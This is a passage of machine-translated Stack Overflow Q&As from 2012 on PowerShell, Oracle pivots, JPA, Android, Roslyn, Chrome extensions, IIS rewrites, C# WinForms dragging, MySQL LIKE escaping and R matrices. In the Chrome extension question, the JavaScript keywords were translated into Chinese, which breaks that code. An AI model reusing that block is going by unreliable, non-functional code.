(Get-Date).ToString("yyyyMMdd_HHmm") >> $filename

echo "Finished" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T22:23:35.093

您是否尝试过先创建文件然后写入文件？或者只是创建/写入文件的不同方式？

[MSDN 上的 New-Item（创建新文件）](http://technet.microsoft.com/en-us/library/ee176914.aspx)

[Out-File（写入文件）](http://technet.microsoft.com/en-us/library/ee176924.aspx)

```
$filename = (Get-Date).ToString("yyyyMMdd_HHmm")+ ".txt"
echo $filename

$filepath = "C:\" + $filename
New-Item $filepath -type file

if (Test-Path $filepath)
{ echo "file exists!"}
else { echo "file doesn't exist"}

(Get-Date).ToString("yyyyMMdd_HHmm") | Out-File $filepath 
```

# sql - 数据库表的行列转换

> ID：13287102
> 
> 赞同：2
> 
> 时间：2012-11-08T10:23:25.947
> 
> 标签：sql, oracle, pivot

我有数据库表。正如我进一步看到的那样，数据采用特定格式。如何在不直接使用查询创建临时表的情况下执行以下转换？col2 不是静态字段 X 和 Y，它是动态确定的，即没有列是动态的。 ![在此处输入图像描述](../Images/8252e3d93d411a8971a51fda5d9a8d5d.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T10:29:44.817

您没有指定您使用的是哪个版本的 Oracle，所以这里有一些解决方案。

如果您使用的是 Oracle 11g+，那么您可以访问该`PIVOT`功能：

```
select *
from
(
  select col1, col2, col3
  from yourtable
) src
pivot
(
  max(col3)
  for col2 in ('X', 'Y')
) piv 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!4/2f936/1)

如果您使用的是另一个版本的 Oracle，那么您可以使用带有`CASE`语句的聚合函数：

```
select col1,
  min(case when col2 = 'X' then col3 end) X,
  min(case when col2 = 'Y' then col3 end) Y
from yourtable
group by col1 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!4/2f936/3)

如果你有未知数量的`col2`值，那么你可以在 oracle 中创建一个过程来生成动态 sql：

```
CREATE OR REPLACE procedure dynamic_pivot(p_cursor in out sys_refcursor)
as
    sql_query varchar2(1000) := 'select col1 ';

    begin
        for x in (select distinct col2 from yourtable order by 1)
        loop
            sql_query := sql_query ||
                ' , min(case when col2 = '''||x.col2||''' then col3 end) as '||x.col2;

                dbms_output.put_line(sql_query);
        end loop;

        sql_query := sql_query || ' from yourtable group by col1';

        open p_cursor for sql_query;
    end;
/ 
```

然后执行它：

```
variable x refcursor
exec dynamic_pivot(:x)
print x 
```

结果应该是一样的：

```
| COL1 |  X  |  Y |
--------------------
|    A |   1 |   3 |
|    B |   2 |   4 | 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:34:43.107

```
select 
  col1 " ",
  sum(case when col2='X' then col3 else 0 end) x,
sum(case when col2='Y' then col3 else 0 end) y
from sample
group by col1 
```

==

# [此问题的 SQL Fiddle 演示](http://sqlfiddle.com/#!4/ae263/5)

![SQL 小提琴截图](../Images/542761e55787f6af9c94d63b7b25d880.png)

# java - java , jpa 强制转换异常

> ID：13287107
> 
> 赞同：0
> 
> 时间：2012-11-08T10:23:46.590
> 
> 标签：java, jpa, casting

这是我第二次和jpa一起玩，

我写了这段代码：

```
 String queryString = "SELECT e.uidprofile, e.profilecode, e.catUso, max(e.zonaClim), e.classePrev, e.beta1, e.beta2, e.beta3, e.beta4"
            + " FROM "
            +  entityClass.getSimpleName()
            + " e "
            + " WHERE e.catUso like :code "
            + " group by e.uidprofile, e.profilecode, e.catUso, e.classePrev, e.beta1, e.beta2, e.beta3, e.beta4"
            + " order by e.uidprofile";

    Query query = entityManager.createQuery(queryString);

    query.setParameter("code", "C" + "%");

    List<SamTbProfileMapping> resultList = query.getResultList();

    ClassLoader c1 = this.getClass().getClassLoader();
    ClassLoader c2 = resultList.getClass().getClassLoader();

    if(resultList.size()>0){
        System.out.println(resultList.get(0).getCatUso());
    } 
```

调试它：

*   `resultList``SamTbProfileMapping`具有正确值的所有字段
*   对象的数量是正确的
*   在`List<SamTbProfileMapping> resultList = query.getResultList();` 我到达`C2`并`null`说`System.out.println(resultList.get(0).getCatUso());` resultList 不能被投射到之后`SamTbProfileMapping`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T10:30:21.977

我认为您应该使用[createQuery 函数的类型化版本](http://docs.oracle.com/javaee/6/api/javax/persistence/EntityManager.html#createQuery%28java.lang.String,%20java.lang.Class%29)（从 1.6 开始提供）

尝试：

```
Query query = entityManager.createQuery(queryString, SamTbProfileMapping.class); 
```

当然，这意味着它`SamTbProfileMapping`必须是一个实体类。而且我不确定聚合列，您可能需要为其应用别名。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T10:30:32.320

您正在使用查询检索数组列表。不是对象列表。

`"Select a, b, c, d, from something"`- 回报`List<Object[]>`

然后以与查询相同的顺序访问单独的成员。例如：

```
 List<Object[]> myList = query.getResultList();

 MyAClass a1 = (MyAClass) myList.get(0)[0];
 MyBClass b1 = (MyBClass) myList.get(0)[1]; 
```

要选择对象列表，您可以使用：

`"select a from MyClass a where ..."`

然后

```
 List<MyClass> myList = query.getResultList();
 MyClass result1 = myList.get(0); 
```

# c++ - 单例对象的构造函数和析构函数被调用两次

> ID：13287113
> 
> 赞同：2
> 
> 时间：2012-11-08T10:24:15.693
> 
> 标签：c++, linux, singleton, valgrind

我在 C++ 中的单例对象中遇到问题。这是解释：

问题信息：我有 4 个共享库（比如 libA.so、libB.so、libC.so、libD.so）和 2 个可执行二进制文件，每个文件都使用另一个处理文件的共享库（比如 libE.so）。

libE.so 的目的是将数据写入文件，如果可执行文件重新启动或文件大小超过一定限制，则会对其进行压缩并创建一个带有时间戳的新文件。它正在使用单例对象。它导出一个用于获取和使用单例的处理程序类。压缩只发生在上述两种情况下。用户/加载程序可执行文件只能指定文件的起始名称，处理程序类不提供其他控件。

libA.so、libB.so、libC.so 和 libD.so 具有几乎相同的行为。它们都有一个类和声明以及一个处理程序的对象，该处理程序获取 libE.so 中的单例实例并将其用于进一步的目的。

所有这些库都链接到两个可执行的二进制文件。如果两个可执行文件中只有一个运行，那么它很好，但是如果两个可执行文件一个接一个地运行，那么第一个启动的可执行文件的文件会被压缩。

调试信息：单例对象的构造函数和析构函数被调用了两次。（对于每个可执行文件）

单例的对象是一个静态对象，永远不会被删除。

可执行文件无法退出/返回给出：

*** 检测到 glibc ***（exe1 或 exe2）：双重释放或损坏（！prev）：some_addr ***

使用二进制 valgrind 运行会得出上述错误是由于单例对象的析构函数造成的。

谢谢

# android - android zxing 二维码生成

> ID：13287119
> 
> 赞同：-1
> 
> 时间：2012-11-08T10:24:44.063
> 
> 标签：android, zxing

我想用 zxing 库生成一个简单文本的二维码，但我找不到任何库或 API。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T10:36:01.607

使用 Zxing api 进行条形扫描仪和生成器

这是一个有用的[链接](https://stackoverflow.com/questions/2050263/using-zxing-to-create-an-android-barcode-scanning-app)也是[zxing](http://code.google.com/p/zxing/)

[Barcode Scanner](https://play.google.com/store/apps/details?id=com.google.zxing.client.android&hl=en)这个应用程序基于 Zxing api。您可以使用所有功能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:46:10.000

该`IntentIntegrator`方法依赖于安装 Barcode Scanner 应用程序。

如果您不想安装第三方应用程序，您可以使用 ZXing 库并使您的应用程序成为独立应用程序。只需按照[此分步指南](https://stackoverflow.com/a/15510698/1181911)进行操作即可。

# c# - 如何以编程方式将程序集引用添加到项目？

> ID：13287123
> 
> 赞同：7
> 
> 时间：2012-11-08T10:25:13.200
> 
> 标签：c#, roslyn

我一直在尝试使用 Roslyn 解析解决方案文件并以编程方式为解决方案中的每个项目添加自定义程序集引用。

我尝试使用以下代码片段来做同样的事情：

```
//The name of the DLL is customLib.dll
var reference = MetadataReference.CreateAssemblyReference("customLib");
project = project.AddMetadataReference(reference); 
```

但是，它在创建 MetadataReference 时遇到 FileNotFoundException。

所以，我的问题是：**如何指定 Roslyn 需要检查指定 dll 的路径**？

谢谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-08T18:27:52.257

`MetadataReference.CreateAssemblyReference`用于获取对 GAC 中程序集的引用。试试这个：

```
project = project.AddMetadataReference(new MetadataFileReference("<path>")); 
```

# .net - 在 WPF 中构建建模应用程序

> ID：13287126
> 
> 赞同：1
> 
> 时间：2012-11-08T10:25:50.057
> 
> 标签：.net, wpf

我希望这个问题对 SO 来说不是太模糊。

我想在 WPF 中构建一个典型的设计器/建模器应用程序。因此，您有一个主要的初始空白画布区域，您可以将项目从工具箱拖到该区域上以构建某物的模型。将项目从工具箱拖入画布后，您需要能够调出一堆属性等。有点像 Visio，或 Visual Studio 中的工作流设计器。

在我开始从头开始构建它之前，我想知道是否有任何工具/框架/库可以帮助我以最少的工作实现这一目标。在我看来，这似乎是一个常见的用例，所以我认为应该有一些帮助。实际上，我考虑重新托管工作流设计器，因为这有很多我想做的事情，但由于我没有以任何方式对工作流进行建模，我认为这不是最好的前进方式。

有没有什么可以为此提供一个起点，或者是一个从头开始的例子？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:54:37.207

这取决于你想要什么样的附加值。我建议查看[YFiles](http://www.yworks.com/en/products_yfiles_dotnetplatform_about.html)，它有一些关于图表的有趣工具。Telerik 和 Syncfusion 有很好的 WPF 控件库，但我不确定他们是否有关于设计师/建模师材料的有趣内容。

# javascript - Chrome.tabs.executeScript 回调函数用法

> ID：13287139
> 
> 赞同：2
> 
> 时间：2012-11-08T10:26:43.090
> 
> 标签：javascript, google-chrome, google-chrome-extension

我正在阅读[Chrome.tabs.executeScript](http://developer.chrome.com/extensions/tabs.html)并且不知道如何使用 executeScript 的回调函数。

例如我有

```
功能按钮（）{
        chrome.browserAction.onClicked.addListener(function(tab) {          
            chrome.tabs.executeScript(tab.id, {file: "content_script.js", allFrames: true}, function(results){
                for（结果中的变量索引）{
                    控制台.log（结果[索引]）；
                }
            });
        });
    }

```

根据该页面“结果（任何可选数组）脚本在每个注入帧中的结果。”

**这是否意味着当 content_script.js 在所有注入的页面和框架中执行时触发回调？以及如何从我的 content_script.js 返回结果？**

谢谢。

**答案：在**[此处](https://stackoverflow.com/questions/13166293/about-chrome-tabs-executescript-id-details-callback?rq=1) 找到答案，“脚本的结果是被评估的最后一个表达式。”

# iis - mod 重写为 IIS 重写规则

> ID：13287141
> 
> 赞同：1
> 
> 时间：2012-11-08T10:26:46.963
> 
> 标签：iis, mod-rewrite

我的 .htaccess 中有一条规则

```
RewriteRule ^([a-zA-Z0-9-_]+)$ listing-search.php?profile=$1 [QSA,L]
RewriteCond %{REQUEST_FILENAME}\.php -f 
```

它基本上在域 (http://mysite.com/19KAREN) 之后查找配置文件名称并提取配置文件详细信息。我尝试使用可用的重写模块将其转换为 IIS7 重写，并且在大多数情况下它工作得很好但是我在[http://mysite.com/blog](http://mysite.com/blog)有一个博客，并且在使用 htaccess 重写时显示博客（正确）但是在 IIS 中，它试图获取名为 blog 的配置文件（不正确）。

如果我要在 URL (http://mysite.com/blog/) 的末尾添加一个斜杠，那么它可以工作，但我相信客户已经发送了没有斜杠的抵押品，所以这不是一个真正的选择。

我尝试添加一个新规则来将[http://mysite.com/blog](http://mysite.com/blog)重写为 .../blog/ 但这也不起作用。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:30:43.597

解决了。向规则添加了一个条件，即如果它不是目录。

# android - 在 TabHost 中 onActivityResult 不起作用

> ID：13287142
> 
> 赞同：0
> 
> 时间：2012-11-08T10:26:48.400
> 
> 标签：android, android-tabhost

我有一个 TabHost 并且在那 4 个不同的活动中。在第一个选项卡中，我可以选择从图库中选择图像或从相机拍照。现在，我使用了 public void onActivityResult(int requestCode, int resultcode, Intent intent) 方法..但是，它没有在 TabHost 中被调用..没有 tabHost 它工作得很好...如何解决这个问题..这是我的代码..请检查我的整个代码..在此先感谢..

```
tblTreePhoto.setOnClickListener(new OnClickListener() 
        {

            @Override
            public void onClick(View arg0) 
            {
                final AlertDialog.Builder alertDialog = new AlertDialog.Builder(getParent());
                alertDialog.setTitle("Select Photo");
                alertDialog.setPositiveButton("Take Photo", new DialogInterface.OnClickListener() 
                {

                    @Override
                    public void onClick(DialogInterface arg0, int arg1) 
                    {
                        if(Tree_Image.count<3)
                        {
                            Intent i1 = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
                            File out = Environment.getExternalStorageDirectory();
                            out = new File(out, "newImage.jpg");
                            i1.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(out));
                            getParent().startActivityForResult(i1, 10); 
                        }
                        else
                        {
                            Toast.makeText(getApplicationContext(), "You can not add more than 2 photos" , 1).show();
                        }
                    }

                });

                alertDialog.setNeutralButton("Gallery", new DialogInterface.OnClickListener() 
                {

                    @Override
                    public void onClick(DialogInterface dialog, int which) 
                    {   
                        if(Tree_Image.count<3)
                        {
                            Intent intent = new Intent();
                            intent.setType("image/*");
                            intent.setAction(Intent.ACTION_GET_CONTENT);
                            getParent().startActivityForResult(Intent.createChooser(intent,"Select Picture"),1);
                        }   
                        else
                        {
                            Toast.makeText(getApplicationContext(), "You can not add more than 2 photos" , 1).show();

                        }
                    }
                });
                alertDialog.setNegativeButton("View Selected Photos", new DialogInterface.OnClickListener() 
                {

                    @Override
                    public void onClick(DialogInterface arg0, int arg1) 
                    {
                        Intent i = new Intent(getParent(),Show_Selected_Images.class);
                        //i.putExtra("cqname", client_name.getText().toString());
                        startActivity(i);
                    }

                });

                alertDialog.show();

            }
        }); 
```

这是我的 onActivityResult 方法：-

```
 protected void onActivityResult(int requestCode, int resultcode, Intent intent)
     {
         int orientation =0;
         Log.d("result ","code uis"+resultcode);

         super.onActivityResult(requestCode, resultcode, intent);

         if (requestCode == 1)
         {
             if (intent != null && resultcode == RESULT_OK)
             {             

                 Uri selectedImage = intent.getData();

                   String[] filePathColumn = {MediaStore.Images.Media.DATA};
                   Cursor cursor = getContentResolver().query(selectedImage, filePathColumn, null, null, null);
                   cursor.moveToFirst();
                   int columnIndex = cursor.getColumnIndex(filePathColumn[0]);
                   String filePath = cursor.getString(columnIndex);
                   Log.v("log","filePath is : "+filePath);

                   cursor.close();
                   try 
                   {
                        ExifInterface exif = new ExifInterface(filePath);
                         orientation = exif.getAttributeInt(ExifInterface.TAG_ORIENTATION, 1);
                        //Toast.makeText(getApplicationContext(), ""+orientation, 1).show();
                        Log.v("log", "ort is "+orientation);

                   } 
                   catch (IOException e)
                   {
                       e.printStackTrace();
                   }

                   if(bmp != null && !bmp.isRecycled())
                   {
                       bmp = null;               
                   }

                   File f = new File(filePath);
                   bmp = decodeFile(f,400,400);

                   if (orientation==6)
                   {
                        Matrix matrix = new Matrix();
                        matrix.postRotate(90);
                        bmp = Bitmap.createBitmap(bmp, 0, 0, bmp.getWidth(), bmp.getHeight(), matrix, true);
                   }
                   else if (orientation==8)
                   {
                        Matrix matrix = new Matrix();
                        matrix.postRotate(270);
                        bmp = Bitmap.createBitmap(bmp, 0, 0, bmp.getWidth(), bmp.getHeight(), matrix, true);
                   }

                   else if (orientation==3)
                   {
                        Matrix matrix = new Matrix();
                        matrix.postRotate(180);
                        bmp = Bitmap.createBitmap(bmp, 0, 0, bmp.getWidth(), bmp.getHeight(), matrix, true);
                   }

                   Log.v("log", "before width is "+bmp.getWidth() + " and height is "+bmp.getHeight());

                   bt=Bitmap.createScaledBitmap(bmp,320, 300, false);
                  // Bitmap bt_thumb = Bitmap.createScaledBitmap(bmp, 70, 70, false);

                   Intent i = new Intent(Tree_Assessmnt_Tree.this,Tree_Image.class);
                   i.putExtra("userid", uid);
                  // TabGroupActivity parentActivity = (TabGroupActivity) getParent();
                   startActivity(i);

             }
             else
             {
                 Log.v("log", "Photopicker canceled");           
             }
         }
         else if (requestCode == 10)
         {

           File out = new File(Environment.getExternalStorageDirectory(), "newImage.jpg");

             if(!out.exists())
             {
                 Log.v("log", "file not found");
                 Toast.makeText(getBaseContext(),"Error while capturing image", Toast.LENGTH_LONG).show();

                return;

            }

             Log.v("log", "file "+out.getAbsolutePath());
             File f = new File(out.getAbsolutePath());

             try
             {

                ExifInterface exif = new ExifInterface(out.getAbsolutePath());
                 orientation = exif.getAttributeInt(ExifInterface.TAG_ORIENTATION, 1);
                //Toast.makeText(getApplicationContext(), ""+orientation, 1).show();
                Log.v("log", "ort is "+orientation);

           } 
             catch (IOException e)
             {
                 e.printStackTrace();
             }

             Bitmap photo =decodeFile(f,400,400);
             if (orientation==6)
             {
                    Matrix matrix = new Matrix();
                    matrix.postRotate(90);
                    photo = Bitmap.createBitmap(photo, 0, 0, photo.getWidth(), photo.getHeight(), matrix, true);
             }
             else if (orientation==8)
             {
                    Matrix matrix = new Matrix();
                    matrix.postRotate(270);
                    photo = Bitmap.createBitmap(photo, 0, 0, photo.getWidth(), photo.getHeight(), matrix, true);
             }

             else if (orientation==3)
             {
                    Matrix matrix = new Matrix();
                    matrix.postRotate(180);
                    photo = Bitmap.createBitmap(photo, 0, 0, photo.getWidth(), photo.getHeight(), matrix, true);
             }

           //Bitmap photo = (Bitmap) intent.getExtras().get("data"); 
           //bt=Bitmap.createScaledBitmap(photo, 380, 520, false);
           bt=photo;
          // bt=Bitmap.createScaledBitmap(photo,320, 300, false);
//         Log.v("log", "before width is "+bt.getWidth() + " and height is "+bt.getHeight());

                /*  gamePic.setBackgroundResource(0);
                  gamePic.setImageBitmap(photo);*/
           //txtPhoto.setText(""+DrawOnImage_Activity.count);

           Intent i = new Intent(Tree_Assessmnt_Tree.this,Tree_Image.class);
           i.putExtra("userid", uid);
           startActivity(i);

         }

         else if(requestCode==6)
         {
              if (intent == null)
              {
                  Log.v("log", "Null data, but RESULT_OK, from image picker!");
                       Toast t = Toast.makeText(this, "No Photo Slected",Toast.LENGTH_SHORT);
                       t.show();

                       return;
              }
         }
     } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:54:53.383

其他的做法是这样的。

1.  单击按钮（您要打开意图）打开另一个活动。
2.  在另一个活动的 onCreate() 上打开该意图。
3.  onActivityResult 设置上一个活动的静态数据并调用finish()。
4.  这样就没有人知道你打开了这样一个活动，你会得到你的数据。

:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:39:28.583

你在`startActivityForResult()`呼唤`getParent()`

尝试删除`getParent()`

# c# - C# 单击窗体并拖动，类

> ID：13287144
> 
> 赞同：1
> 
> 时间：2012-11-08T10:27:11.407
> 
> 标签：c#, winforms, events, mouseevent

我知道您可以使用表单单击和拖动[但是](https://stackoverflow.com/questions/4767831/drag-borderless-windows-form-by-mouse) 说我希望它不使用该代码并使用我自己的代码，我该怎么做？

这是我到目前为止所拥有的：

```
public partial class Form1 : Form
{
    MouseDragFormMove dragForm;

    public Form1()
    {
        InitializeComponent();

        dragForm = new MouseDragFormMove(this);
        dragForm.AllowMouseDownDrag = true;
    }
}       
public class MouseDragFormMove
{
    private bool _status;
    public bool AllowMouseDownDrag
    {
        get { return _status; }
        set { _status = value; }
    }

    private Form parent;
    public MouseDragFormMove(Form self)
    {
        _status = false;
        parent = self;
        parent.MouseDown +=new MouseEventHandler(parent_MouseDown);
        parent.MouseUp += new MouseEventHandler(parent_MouseUp);
        parent.MouseMove +=new MouseEventHandler(parent_MouseMove);            
    }

    public void showPos()
    {
        MessageBox.Show(parent.Location.X + ", " + parent.Location.Y);
    }

    private Point CPoint;
    private Point MPoint;
    private bool isDragging;

    private void parent_MouseDown(object sender, MouseEventArgs e)
    {
        CPoint = parent.Location;
        MPoint = getMousePoint(e, CPoint);
        isDragging = true;
    }
    private void parent_MouseUp(object sender, MouseEventArgs e)
    {
        isDragging = false;
    }
    private void parent_MouseMove(object sender, MouseEventArgs e)
    {
        CPoint = parent.Location;
        MPoint = getMousePoint(e, CPoint);

        if (isDragging && _status)
        {
            parent.Location = MPoint;
        }
    }
    private Point getMousePoint(MouseEventArgs e, Point FP)
    {
        int x = FP.X + (e.Location.X * 2);
        int y = FP.Y + (e.Location.Y * 2);

        return new Point(x, y);
    }
} 
```

我究竟做错了什么？我无法让它工作。而且，它也会闪烁

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:14:56.163

问题是您使用的是相对于表单而不是相对于屏幕的鼠标点。请参阅下面的解决方案。我`Cursor.Position`用来获取鼠标屏幕位置。

```
public class MouseDragFormMove
{
    private bool _status;
    public bool AllowMouseDownDrag
    {
        get { return _status; }
        set { _status = value; }
    }

    private Form parent;
    public MouseDragFormMove(Form self)
    {
        _status = false;
        parent = self;
        parent.MouseDown += new MouseEventHandler(parent_MouseDown);
        parent.MouseUp += new MouseEventHandler(parent_MouseUp);
        parent.MouseMove += new MouseEventHandler(parent_MouseMove);
    }

    private Point MPoint;
    private bool isDragging;
    private Point touchPoint;

    private void parent_MouseDown(object sender, MouseEventArgs e)
    {
        isDragging = true;

        // Capture the point relative to the form
        touchPoint = e.Location;
    }
    private void parent_MouseUp(object sender, MouseEventArgs e)
    {
        isDragging = false;
    }

    private void parent_MouseMove(object sender, MouseEventArgs e)
    {
        MPoint = new Point(Cursor.Position.X - touchPoint.X, Cursor.Position.Y - touchPoint.Y);

        if (isDragging && AllowMouseDownDrag && !parent.Location.Equals(MPoint))
        {
            parent.Location = MPoint;
        }
    }
} 
```

# mysql - MySQL：查询 unicode 实体

> ID：13287145
> 
> 赞同：9
> 
> 时间：2012-11-08T10:27:12.733
> 
> 标签：mysql, unicode

我需要从数据库中找到**Lämmönmyyntipalvelut这个词。**只是，在数据库中，它位于一个字段中，其值是一个 PHP 数组，使用 json_encode() 转换为 JSON，因此特殊字符被写入十六进制 unicode。

所以我的查询是

```
SELECT * FROM table WHERE (services LIKE '%Lämmönmyyntipalvelut%') 
```

没有结果。没有惊喜。接下来，使用转换的特殊字符进行查询：

```
SELECT * FROM table WHERE (services LIKE '%L\u00e4mm\u00f6nmyyntipalvelut%') 
```

没有结果，我想知道为什么。接下来我测试了仅查询特殊字符：

```
SELECT * FROM table WHERE (services LIKE '%\u00e4%') 
```

找到了应该找到的东西。接下来我开始添加东西（从 L 开始），看看哪里出了问题：

```
SELECT * FROM table WHERE (services LIKE '%L\u00e4%') 
```

没有结果。另一个测试：

```
SELECT * FROM table WHERE (services LIKE '%\u00e4mm%') 
```

找到了应该找到的东西。

所以我的结论是反斜杠在某种程度上把事情搞砸了，但我不明白怎么做？

**编辑：**

服务领域的具体内容：

```
["Neuvonta","L\u00e4mm\u00f6nmyyntipalvelut",
"Mets\u00e4-\/energiapuunkorjuupalvelut"] 
```

准确查询：

```
SELECT id, uid, company_name, services, logo FROM rekisteroeidy_toimijaks 
WHERE 
    (services LIKE '%L\u00e4mm\u00f6nmyyntipalvelut%' AND 
    services LIKE '%Mets\u00e4-\/energiapuunkorjuupalvelut%') 
ORDER BY company_name ASC 
```

我添加了一些换行符以提高可读性。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-11T00:51:52.290

> 我完全不知道为什么，但是三重转义有帮助！

好吧，这只是双重转义，但它确实有效，原因如下：在 MySQL 中，当您使用`LIKE`运算符时，涉及到第二层转义。

```
services LIKE '%L\\\\u00e4mm\\\\u00f6n%' 
```

解析 MySQL 字符串文字可以让您与 LIKE-query 进行比较`%L\\u00e4mm\\u00f6n%`。因为 MySQL`\`在 LIKE 查询中将其视为转义，所以它实际上将匹配包含`L\u00e4mm\u00f6n`.

这样做的原因是您可以将字符串与包含文字`%`或`_`字符的查询表达式进行匹配。例如，如果我想在一列中搜索文字字符串，`100%`我可以将其与`100\%`（在查询中写为`'100\\%'`

不幸的是，MySQL 使用反斜杠进行 LIKE 查询转义和字符串文字转义，特别是考虑到您可能正在使用一种也使用它们的封闭编程语言编写，最终得到实际的三重编码，看起来像`"services LIKE '%L\\\\\\\\u00e4mm\\\\\\\\u00f6n%'"`- 啊！

不幸的是，这种行为不符合 ANSI SQL，并且在任何其他数据库中都不起作用。ANSI SQL 表示默认情况下 LIKE 查询中没有转义字符，因此如果您想匹配文字`%`或者`_`您必须通过指定自己的转义字符来选择加入，例如：

```
something LIKE '100=%' ESCAPE '=' 
```

为了跨数据库的兼容性，最好总是使用`LIKE`...`ESCAPE`形式，并选择可怕的反斜杠以外的东西！（除此之外 - MySQL 用于 SQL 字符串文字转义的反斜杠也不符合 ANSI！但您可以使用 NO_BACKSLASH_ESCAPES sql_mode 设置关闭这种不当行为。）

可能更好的主意是拆分`services`成第二个表，而不是将它们压缩成单个字符串列 - 即。把你的模式放在第一范式中。然后，您可以简单地查找单个值，而不必进行缓慢的全表扫描子字符串匹配。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-08T10:31:08.260

反斜杠是元字符，MySQL 是这样理解的：“删除下一个字符，不要将其解析为元字符”。

所以你需要转义反斜杠：

```
SELECT * FROM table WHERE (services LIKE '%L\\u00e4%') 
```

现在，MySQL 将用“\”替换“\\”（第一个反斜杠是用于转义第二个反斜杠的元字符）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T11:19:09.983

I have absolutely no idea why, but **triple escaping** helps!

```
SELECT id, uid, company_name, services, logo
FROM rekisteroeidy_toimijaks
    WHERE (
    services LIKE  '%L\\\\u00e4mm\\\\u00f6n%'
)
ORDER BY company_name ASC 
LIMIT 0 , 30 
```

# r - 如何合并具有不同行数的两个矩阵

> ID：13287147
> 
> 赞同：1
> 
> 时间：2012-11-08T10:27:13.030
> 
> 标签：r, matrix, dataframe

假设我有 2 个矩阵，如下所示：

```
structure(c(0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.315789473684211), .Dim = c(14L, 
1L), .Dimnames = list(c("ch5_98500001", "ch5_99500001", "ch5_100500001", 
"ch5_101500001", "ch5_102500001", "ch5_103500001", "ch5_104500001", 
"ch5_105500001", "ch5_106500001", "ch5_110500001", "ch5_111500001", 
"ch5_112500001", "ch5_113500001", "ch5_114500001"), "loh"))
                    loh
ch5_98500001  0.3157895
ch5_99500001  0.3157895
ch5_100500001 0.3157895
ch5_101500001 0.3157895
ch5_102500001 0.3157895
ch5_103500001 0.3157895

structure(c(0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.315789473684211, 0.315789473684211, 
0.315789473684211, 0.315789473684211, 0.368421052631579, 0.368421052631579, 
0.368421052631579, 0.368421052631579, 0.368421052631579, 0.368421052631579, 
0.368421052631579, 0.368421052631579, 0.368421052631579, 0.368421052631579, 
0.368421052631579, 0.368421052631579, 0.368421052631579, 0.368421052631579, 
0.368421052631579, 0.368421052631579, 0.368421052631579, 0.368421052631579, 
0.368421052631579, 0.368421052631579, 0.368421052631579, 0.368421052631579, 
0.368421052631579, 0.368421052631579, 0.368421052631579, 0.368421052631579, 
0.368421052631579, 0.368421052631579, 0.368421052631579, 0.368421052631579, 
0.368421052631579, 0.368421052631579, 0.368421052631579, 0.368421052631579, 
0.368421052631579, 0.368421052631579, 0.368421052631579, 0.368421052631579, 
0.368421052631579, 0.368421052631579, 0.368421052631579, 0.368421052631579, 
0.368421052631579, 0.368421052631579, 0.368421052631579, 0.368421052631579
), .Dim = c(83L, 1L), .Dimnames = list(c("ch8_20500001", "ch8_21500001", 
"ch8_22500001", "ch8_23500001", "ch8_24500001", "ch8_25500001", 
"ch8_26500001", "ch8_27500001", "ch8_28500001", "ch18_500001", 
"ch18_1500001", "ch18_2500001", "ch18_3500001", "ch18_4500001", 
"ch18_5500001", "ch18_6500001", "ch18_7500001", "ch18_8500001", 
"ch18_9500001", "ch18_10500001", "ch18_11500001", "ch18_12500001", 
"ch18_13500001", "ch18_14500001", "ch18_15500001", "ch18_16500001", 
"ch18_17500001", "ch18_18500001", "ch18_19500001", "ch18_20500001", 
"ch18_21500001", "ch18_24500001", "ch18_25500001", "ch18_26500001", 
"ch18_27500001", "ch18_28500001", "ch18_29500001", "ch18_30500001", 
"ch18_31500001", "ch18_32500001", "ch18_33500001", "ch18_34500001", 
"ch18_35500001", "ch18_36500001", "ch18_37500001", "ch18_38500001", 
"ch18_39500001", "ch18_40500001", "ch18_41500001", "ch18_42500001", 
"ch18_43500001", "ch18_44500001", "ch18_45500001", "ch18_46500001", 
"ch18_47500001", "ch18_48500001", "ch18_49500001", "ch18_50500001", 
"ch18_51500001", "ch18_52500001", "ch18_53500001", "ch18_54500001", 
"ch18_55500001", "ch18_56500001", "ch18_57500001", "ch18_58500001", 
"ch18_59500001", "ch18_60500001", "ch18_61500001", "ch18_62500001", 
"ch18_63500001", "ch18_64500001", "ch18_65500001", "ch18_66500001", 
"ch18_67500001", "ch18_68500001", "ch18_69500001", "ch18_70500001", 
"ch18_71500001", "ch18_72500001", "ch18_73500001", "ch18_74500001", 
"ch18_75500001"), "loss"))
                  loss
ch8_20500001 0.3157895
ch8_21500001 0.3157895
ch8_22500001 0.3157895
ch8_23500001 0.3157895
ch8_24500001 0.3157895
ch8_25500001 0.3157895
ch8_26500001 0.3157895
ch8_27500001 0.3157895
